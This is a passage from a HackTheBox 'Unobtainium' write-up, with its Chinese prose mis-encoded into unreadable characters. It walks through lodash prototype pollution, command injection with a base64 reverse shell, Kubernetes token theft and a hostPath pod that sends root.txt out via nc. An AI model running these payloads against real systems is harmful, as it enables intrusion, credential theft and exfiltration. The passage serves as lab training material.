true});\\n});\\napp.post('/upload', (req, res) => {\\n  const user = findUser(req.body.auth || {});\\n  if (!user || !user.canUpload) {\\n    res.status(403).send({ok: false, error: 'Access denied'});\\n    return;\\n  }\\n\\n\\n  filename = req.body.filename;\\n  root.upload(\\\"./\\\",filename, true);\\n  res.send({ok: true, Uploaded_File: filename});\\n});\\n\\napp.post('/todo', (req, res) => {\\n\\tconst user = findUser(req.body.auth || {});\\n\\tif (!user) {\\n\\t\\tres.status(403).send({ok: false, error: 'Access denied'});\\n\\t\\treturn;\\n\\t}\\n\\n\\tfilename = req.body.filename;\\n        testFolder = \\\"/usr/src/app\\\";\\n        fs.readdirSync(testFolder).forEach(file => {\\n                if (file.indexOf(filename) > -1) {\\n                        var buffer = fs.readFileSync(filename).toString();\\n                        res.send({ok: true, content: buffer});\\n                }\\n        });\\n});\\n\\napp.listen(3000);\\nconsole.log('Listening on port 3000...');\\n\"}\n```\nè¿™ä¸ªæ ¼å¼æ˜¯çœŸçš„ç³Ÿç³•ï¼Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæˆ‘ä»¬ç»™å®ƒç¾åŒ–ä¸€ä¸‹\n\n```Plain Text\nvar root = require(\"google-cloudstorage-commands\");\nconst express = require('express');\nconst { exec } = require(\"child_process\");\nconst bodyParser = require('body-parser');\nconst _ = require('lodash');\nconst app = express();\nvar fs = require('fs');\n\nconst users = [\n {name: 'felamos', password: 'Winter2021'},\n {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},\n];\n\nlet messages = [];\nlet lastId = 1;\n\nfunction findUser(auth) {\n return users.find((u) =>\n u.name === auth.name &&\n u.password === auth.password);\n}\n\napp.use(bodyParser.json());\n\napp.get('/', (req, res) => {\n res.send(messages);\n});\n\napp.put('/', (req, res) => {\n const user = findUser(req.body.auth || {});\n\n if (!user) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n const message = {\n icon: '__',\n };\n\n _.merge(message, req.body.message, {\n id: lastId++,\n timestamp: Date.now(),\n userName: user.name,\n });\n\n messages.push(message);\n res.send({ok: true});\n});\n\napp.delete('/', (req, res) => {\n const user = findUser(req.body.auth || {});\n\n if (!user || !user.canDelete) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n messages = messages.filter((m) => m.id !== req.body.messageId);\n res.send({ok: true});\n});\napp.post('/upload', (req, res) => {\n const user = findUser(req.body.auth || {});\n if (!user || !user.canUpload) {\n res.status(403).send({ok: false, error: 'Access denied'});\n return;\n }\n\n filename = req.body.filename;\n root.upload(\"./\",filename, true);\n res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post('/todo', (req, res) => {\n        const user = findUser(req.body.auth || {});\n        if (!user) {\n                res.status(403).send({ok: false, error: 'Access denied'});\n                return;\n        }\n\n        filename = req.body.filename;\n testFolder = \"/usr/src/app\";\n fs.readdirSync(testFolder).forEach(file => {\n if (file.indexOf(filename) > -1) {\n var buffer = fs.readFileSync(filename).toString();\n res.send({ok: true, content: buffer});\n }\n });\n});\n\napp.listen(3000);\nconsole.log('Listening on port 3000...');\n```\næˆ‘ä»¬è¯»å–æ–‡ä»¶`package.json`ï¼Œå¾—åˆ°äº†\n\n```Plain Text\n{\"ok\":true,\"content\":\"{\\n  \\\"name\\\": \\\"Unobtainium-Server\\\",\\n  \\\"version\\\": \\\"1.0.0\\\",\\n  \\\"description\\\": \\\"API Service for Electron client\\\",\\n  \\\"main\\\": \\\"index.js\\\",\\n  \\\"scripts\\\": {\\n    \\\"start\\\": \\\"node index.js\\\"\\n  },\\n  \\\"author\\\": \\\"felamos\\\",\\n  \\\"license\\\": \\\"ISC\\\",\\n  \\\"dependencies\\\": {\\n    \\\"body-parser\\\": \\\"1.18.3\\\",\\n    \\\"express\\\": \\\"4.16.4\\\",\\n    \\\"lodash\\\": \\\"4.17.4\\\",\\n    \\\"google-cloudstorage-commands\\\": \\\"0.0.1\\\"\\n  },\\n  \\\"devDependencies\\\": {}\\n}\\n\"}\n```\næˆ‘ä»¬ç¾åŒ–ä¸€ä¸‹\n\n```Plain Text\n{\n  \"name\": \"Unobtainium-Server\",\n  \"version\": \"1.0.0\",\n  \"description\": \"API Service for Electron client\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"start\": \"node index.js\"\n  },\n  \"author\": \"felamos\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"body-parser\": \"1.18.3\",\n    \"express\": \"4.16.4\",\n    \"lodash\": \"4.17.4\",\n    \"google-cloudstorage-commands\": \"0.0.1\"\n  },\n  \"devDependencies\": {}\n}\n```\n> Lodashhttps://snyk.io/vuln/SNYK-JS-LODASH-73638\n\n> google-cloudstorage-commandshttps://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431\n\nä»ä¸Šé¢çš„å¸®åŠ©æ–‡æ¡£ï¼Œæˆ‘å‘ç°å¯ä»¥å‘½ä»¤æ³¨å…¥\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nTEXT=\"$1\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"message\":\n    {\n        \"text\":${TEXT}\n    }\n}\nEOF\n\ncurl -s \\\n     -X PUT \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     \"http://${RHOST}:${RPORT}/\" \\\n| jq .\n```\n```Plain Text\n(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ./exploit.sh '{\"constructor\":{\"prototype\":{\"canDelete\":true, \"canUpload\":true}}}'\n{\n  \"ok\": true\n}\n```\næˆåŠŸ\n\nè¿™ä¸ªæˆåŠŸçš„å“åº”æ„å‘³ç€æˆ‘ä»¬çœŸçš„å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œè®©æˆ‘ä»¬è¿è¡Œè„šæœ¬2æ£€æŸ¥æ˜¯å¦å¯ä»¥å†™å…¥æ–‡ä»¶\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"unobtainium.htb\"\nRPORT=31337\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=\"& echo lucifiel | tee lucifiel.txt\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\ncurl -s \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     -o /dev/null \\\n     \"http://${RHOST}:${RPORT}/upload\"\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ./exploit2.sh\n```\nè¿è¡ŒæˆåŠŸï¼Œè®©æˆ‘ä»¬è¯»å–\n\n```Plain Text\nlucifiel.txt\n```\nè¯•è¯•æ˜¯å¦å†™å…¥æˆåŠŸ\n\n![](Hackthebox-Unobtanium/image7.png)\n\nå†™å…¥æˆåŠŸï¼Œç°åœ¨æˆ‘ä»¬æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´getshell\n\né¦–å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\n```Plain Text\nPOST /upload HTTP/1.1\n\nHost: unobtainium.htb:31337\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\n\nAccept: */*\n\nContent-Type: application/json\n\nContent-Length: 151\n\nConnection: close\n\n{\"auth\":{\"name\":\"felamos\",\"password\":\"Winter2021\"},\"filename\":\"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.53/4444 0>&1' | base64) | base64 -d | bash\"}\n```\næ‰§è¡Œåï¼ŒæˆåŠŸè·å¾—ä¸€ä¸ªshell\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Downloads]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58362\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@webapp-deployment-5d764566f4-mbprj:/usr/src/app# whoami && id\nwhoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\nroot@webapp-deployment-5d764566f4-mbprj:/usr/src/app#\n```\n```Plain Text\nroot@webapp-deployment-5d764566f4-mbprj:~# cd /root\ncd /root\nroot@webapp-deployment-5d764566f4-mbprj:~# ls\nls\nuser.txt\nroot@webapp-deployment-5d764566f4-mbprj:~# cat user.txt\ncat user.txt\n7ff2ddd449da8a15c66289e2ec015cd9\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„rootæ˜¯åœ¨ä¸€ä¸ªdockerå®¹å™¨é‡Œ\n\nå› ä¸ºæ²¡å•¥æ€è·¯ï¼Œè®©æˆ‘ä»¬å…ˆè·‘ä¸€ä¸‹linpeaså§ \n\n> https://github.com/LucifielHack/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh\n\nä½¿ç”¨python3åœ¨æœ¬åœ°å¼€å¯ä¸€ä¸ªhttpæœåŠ¡\n\n```Plain Text\npython3 -m http.server\n```\nç„¶ååœ¨shellä¸­ä½¿ç”¨wgetè¿›è¡Œä¸‹è½½\n\n```Plain Text\nwget http://10.10.14.53:8000/linpeas.sh\n```\nç„¶åæ·»åŠ æƒé™åè¿è¡Œ\n\n```Plain Text\nchmod +x linpeas.sh\n./linpeas.sh\n```\nåœ¨ç»“æœä¸­çœ‹åˆ°äº†ä¸€å¥\n\n```Plain Text\n* * * * * find / -name kubectl -exec rm {} \\;\n* * * * * find / -name kubectl -exec rm {} \\;\n```\næœ‰ä¸€ä¸ª`cronjob`æ­£åœ¨è¿è¡Œï¼Œæ¯åˆ†é’Ÿåˆ é™¤å®¹å™¨ä¸­çš„`kubectl`\n\nä½†æ˜¯å®¹å™¨ä¸­æ²¡æœ‰`kubectl`å¯æ‰§è¡Œæ–‡ä»¶\n\nè®©æˆ‘ä»¬ä¸‹è½½ä¸€ä¸ª`kubectl`å¯æ‰§è¡Œæ–‡ä»¶å¹¶å°†å…¶ä¼ è¾“åˆ°`/tmp`æ–‡ä»¶å¤¹å†…çš„`docker`ä¸­ \n\n> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux\n\n> åœ¨Linuxä¸Šä½¿ç”¨curlå®‰è£…kubectläºŒè¿›åˆ¶æ–‡ä»¶\n\n```Plain Text\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\npython3 -m http.server 80\n```\nç„¶ååœ¨shellä¸­ä½¿ç”¨wgetè¿›è¡Œä¸‹è½½\n\n```Plain Text\nwget http://10.10.14.53/kubectl -o /tmp/kubectl-lucifiel\ncd /tmp/\nchmod +x kubectl-lucifiel\n```\næ›´æ”¹ä¸€ä¸ªåå­—é¿å…è¢«cronjobç»™åˆ æ‰\n\né¦–å…ˆè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹kubectl\n\n```Plain Text\n./kubectl-lucifiel get namespace\n./kubectl-lucifiel get pods -n dev\n./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev\n```\n```Plain Text\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace\n<4566f4-h5zhw:/tmp# ./kubectl-lucifiel get namespace\nNAME              STATUS   AGE\ndefault           Active   180d\ndev               Active   179d\nkube-node-lease   Active   180d\nkube-public       Active   180d\nkube-system       Active   180d\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev\n<66f4-h5zhw:/tmp# ./kubectl-lucifiel get pods -n dev\nNAME                                READY   STATUS    RESTARTS   AGE\ndevnode-deployment-cd86fb5c-6ms8d   1/1     Running   28         179d\ndevnode-deployment-cd86fb5c-mvrfz   1/1     Running   29         179d\ndevnode-deployment-cd86fb5c-qlxww   1/1     Running   29         179d\nroot@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl-lucifiel describe pod devnode-deployment-cd86fb5c-6ms8d -n dev\n<scribe pod devnode-deployment-cd86fb5c-6ms8d -n dev\nName:         devnode-deployment-cd86fb5c-6ms8d\nNamespace:    dev\nPriority:     0\nNode:         unobtainium/10.10.10.235\nStart Time:   Sun, 17 Jan 2021 18:16:21 +0000\nLabels:       app=devnode\n              pod-template-hash=cd86fb5c\nAnnotations:  <none>\nStatus:       Running\nIP:           172.17.0.8\nIPs:\n  IP:           172.17.0.8\nControlled By:  ReplicaSet/devnode-deployment-cd86fb5c\nContainers:\n  devnode:\n    Container ID:   docker://c22604a2e5d200e2d08b41724e76633954e82ba9d5f4ab201207860f9dc9b91f\n    Image:          localhost:5000/node_server\n    Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c\n    Port:           3000/TCP\n    Host Port:      0/TCP\n    State:          Running\n      Started:      Fri, 16 Jul 2021 05:11:42 +0000\n    Last State:     Terminated\n      Reason:       Error\n      Exit Code:    137\n      Started:      Wed, 24 Mar 2021 16:01:28 +0000\n      Finished:     Wed, 24 Mar 2021 16:02:13 +0000\n    Ready:          True\n    Restart Count:  28\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-rmcd6:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-rmcd6\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s\n                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s\nEvents:          <none>\n```\nåˆ©ç”¨æ–¹æ³•å’Œå‰é¢ä¸€æ ·ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹è„šæœ¬\n\n```Plain Text\n#!/bin/bash\n\nRHOST=\"127.0.0.1\"\nRPORT=3000\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nTEXT=\"$1\"\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"message\":\n    {\n        \"text\":${TEXT}\n    }\n}\nEOF\n\ncurl -s \\\n     -X PUT \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     \"http://${RHOST}:${RPORT}/\" \\\n| jq .\n```\n```Plain Text\n#!/bin/bash\n\nRHOST=\"127.0.0.1\"\nRPORT=3000\nUA=\"Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\"\nPROXY=\"127.0.0.1:8080\"\nFILE=$1\n\ncat - <<EOF > message.json\n{\n    \"auth\":\n    {\n        \"name\":\"felamos\",\n        \"password\":\"Winter2021\"\n    },\n    \"filename\":\"${FILE}\"\n}\nEOF\n\ncurl -s \\\n     -A \"${UA}\" \\\n     -H \"Content-Type: application/json\" \\\n     -d \"$(cat message.json | jq -c)\" \\\n     -x \"${PROXY}\" \\\n     -o /dev/null \\\n     \"http://${RHOST}:${RPORT}/upload\"\n```\næˆ‘ä»¬éœ€è¦ä½¿ç”¨`Chisel`å°†ç«¯å£è½¬å‘åˆ°`devnode-deployment`å®¹å™¨`â€œ172.17.0.8:3000â€` \n\n> å‚è€ƒè§†é¢‘ https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s\n\n> ä¸‹è½½åœ°å€ https://github.com/jpillora/chisel\n\n> å¦‚æœé‡åˆ°connect: connection refusedï¼Œè§£å†³æ–¹æ¡ˆ https://blog.csdn.net/hhyukJae/article/details/106980818\n\n```Plain Text\nå‘½ä»¤æ‰§è¡Œæ­¥éª¤\ngo chisel\ndu -hs chisel\ngo build -ldflags=\"-s -w\"\nupx brute chisel\ndu -hs chisel\n```\nç„¶åä½¿ç”¨python3å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ä»¥åï¼Œä½¿ç”¨wgetä¸‹è½½åˆ°é¶æœºé‡Œ\n\nç»™chiselä¸€ä¸ª777æƒé™åï¼Œä½¿ç”¨chiselå¼€å¯ä¸€ä¸ªæœåŠ¡\n\n```Plain Text\næœ¬åœ°è¿è¡Œ\nchmod 777 chisel\n./chisel server -p 9999 --reverse\n\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop/chisel]\nâ””â”€# ./chisel server -p 9999 --reverse\n2021/07/17 02:45:18 server: Reverse tunnelling enabled\n2021/07/17 02:45:18 server: Fingerprint kcPnWygZKzUCU+9rAzUk0r6I13LgnEuy/vKZsUNEgCQ=\n2021/07/17 02:45:18 server: Listening on http://0.0.0.0:9999\n```\n```Plain Text\né¶æœºè¿è¡Œ\nchmod 777 chisel\n./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n\nroot@webapp-deployment-5d764566f4-mbprj:/tmp# ./chisel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n<isel client 10.10.14.53:9999 R:3000:172.17.0.8:3000\n2021/07/16 19:04:27 client: Connecting to ws://10.10.14.53:9999\n2021/07/16 19:04:29 client: Connected (Latency 251.63886ms)\n```\nç„¶åç°åœ¨è®©æˆ‘ä»¬è¿è¡Œä¿®æ”¹åçš„`exploit.sh`\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ./exploit.sh '{\"constructor\":{\"prototype\":{\"canDelete\":true, \"canUpload\":true}}}'                                                                                                                         4 â¨¯\n{\n  \"ok\": true\n}\n```\nç„¶åè¿è¡Œ`exploit2.sh`\n\n```Plain Text\n./exploit2.sh \"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.53/5555 0>&1' | base64) | base64 -d | bash\"\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 5555\nlistening on [any] 5555 ...\nconnect to [10.10.14.53] from (UNKNOWN) [10.10.10.235] 58012\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# whoami && id\nwhoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸè·å¾—å¦ä¸€ä¸ªshell\n\nç„¶åæˆ‘ä»¬åˆ°`/tmp/`ç›®å½•ä¸‹ç»§ç»­è¿è¡Œ`kubectl`è„šæœ¬\n\n```Plain Text\ncd /tmp\n./kubectl-lucifiel get secrets -n kube-system\n\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel get secrets -n kube-system\n</tmp# ./kubectl-lucifiel get secrets -n kube-system\nNAME                                             TYPE                                  DATA   AGE\nattachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      180d\nbootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      180d\nc-admin-token-tfmp2                              kubernetes.io/service-account-token   3      180d\ncertificate-controller-token-thnxw               kubernetes.io/service-account-token   3      180d\nclusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      180d\ncoredns-token-dbp92                              kubernetes.io/service-account-token   3      180d\ncronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      180d\ndaemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      180d\ndefault-token-l85f2                              kubernetes.io/service-account-token   3      180d\ndeployment-controller-token-cwgst                kubernetes.io/service-account-token   3      180d\ndisruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      180d\nendpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      180d\nendpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      180d\nendpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      180d\nexpand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      180d\ngeneric-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      180d\nhorizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      180d\njob-controller-token-h6kg8                       kubernetes.io/service-account-token   3      180d\nkube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      180d\nnamespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      180d\nnode-controller-token-k6p6v                      kubernetes.io/service-account-token   3      180d\npersistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      180d\npod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      180d\npv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      180d\npvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      180d\nreplicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      180d\nreplication-controller-token-jz8k8               kubernetes.io/service-account-token   3      180d\nresourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      180d\nroot-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      180d\nservice-account-controller-token-44bfm           kubernetes.io/service-account-token   3      180d\nservice-controller-token-pzjnq                   kubernetes.io/service-account-token   3      180d\nstatefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      180d\nstorage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      180d\ntoken-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      180d\nttl-controller-token-z87px                       kubernetes.io/service-account-token   3      180d\n```\næ¥ç€è®©æˆ‘ä»¬è·å–ä»¤ç‰Œ\n\n```Plain Text\n./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system\n\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl-lucifiel describe secrets/c-admin-token-tfmp2 -n kube-system\n<describe secrets/c-admin-token-tfmp2 -n kube-system\nName:         c-admin-token-tfmp2\nNamespace:    kube-system\nLabels:       <none>\nAnnotations:  kubernetes.io/service-account.name: c-admin\n              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0\n\nType:  kubernetes.io/service-account-token\n\nData\n====\ntoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow\nca.crt:     1066 bytes\nnamespace:  11 bytes\n```\nè®©æˆ‘ä»¬åˆ—å‡ºtoken\n\n```Plain Text\nroot@devnode-deployment-cd86fb5c-6ms8d:/tmp# /tmp/kubectl-lucifiel --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info\n<579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info\nKubernetes control plane is running at https://10.96.0.1:443\nKubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy\n\nTo further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.\n```\nåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ª`lucifiel.yaml`è„šæœ¬\n\n```Plain Text\napiVersion: v1\nkind: Pod\nmetadata:\n  name: some-pod\n  namespace: default\nspec:\n  containers:\n    - name: web\n      image: localhost:5000/dev-alpine\n      command: [\"/bin/sh\"]\n      args: [\"-c\", 'cat /root/root.txt | nc -nv 10.10.14.53 6666; sleep 100000']\n      volumeMounts:\n      - mountPath: /root/\n        name: root-flag\n  volumes:\n  - hostPath:\n      path: /root/\n      type: \"\"\n    name: root-flag\n```\nç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå¹¶ä¿å­˜æ–‡ä»¶ä¸º`root.txt`\n\n```Plain Text\nnc -nvlp 6666 > root.txt\n```\nç„¶åè¿è¡Œè¯¥è„šæœ¬\n\n```Plain Text\n/tmp/kubectl-lucifiel create -f /tmp/lucifiel.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat 